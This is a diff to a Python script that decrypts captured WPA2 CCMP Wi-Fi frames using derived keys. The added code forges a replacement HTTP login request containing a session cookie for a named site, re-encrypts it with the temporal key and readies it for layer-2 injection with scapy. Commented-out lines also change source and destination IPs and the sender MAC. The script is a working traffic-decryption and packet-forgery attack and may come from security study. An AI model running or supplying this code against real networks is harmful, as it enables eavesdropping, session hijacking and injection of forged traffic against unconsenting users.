@@ -1,11 +1,10 @@
 import hashlib
 import binascii
 import hmac
-import binascii
 from typing import Tuple
 from Crypto.Cipher import AES # pip install cryptography pycryptodome
 from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
-from scapy.all import RadioTap, Dot11QoS, Dot11CCMP, LLC, hexstr, EAPOL, Raw
+from scapy.all import RadioTap, Dot11QoS, Dot11CCMP, LLC, hexstr, EAPOL, Raw, IP, sendp
 
 
 def prf_80211i(K: bytes, A: bytes, B: bytes, Len: int):
@@ -140,10 +139,28 @@ def main():
 
     plain_data = wpa2_decrypt(tk, priority, station_mac, ccmp_iv, encrypted_data)
     LLC_frame = LLC(plain_data)
-    # LLC_frame.show()
     application_layer = LLC_frame[Raw].load
-    print(application_layer.decode())
+    # print(application_layer.decode())
 
+    tampered_planintext = """GET /login.php HTTP/1.1
+Host: cobla.io
+Connection: keep-alive
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://cobla.io/article.php?no=3199
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=a8pa4vfohiclm8tbc6mc4lidui"""
+
+    LLC_frame.load = tampered_planintext.encode()
+    # LLC_frame[IP].src = "192.168.0.4" // 변조 가능
+    # LLC_frame[IP].dst = "43.201.25.161" // 변조 가능
+    tampered_llc = wpa2_encrypt(tk, priority, station_mac, ccmp_iv, bytes(LLC_frame))
+    radioTap[Dot11CCMP].data = tampered_llc
+    # radioTap.addr2 = "d4:54:8b:3c:1a:4a" // 변조 가능 wifi adapter mac 98:48:27:88:1e:9d
+    # sendp(radioTap, iface="wlan0") // 2계층 패킷 전송
 
 if __name__ == '__main__':
     main()
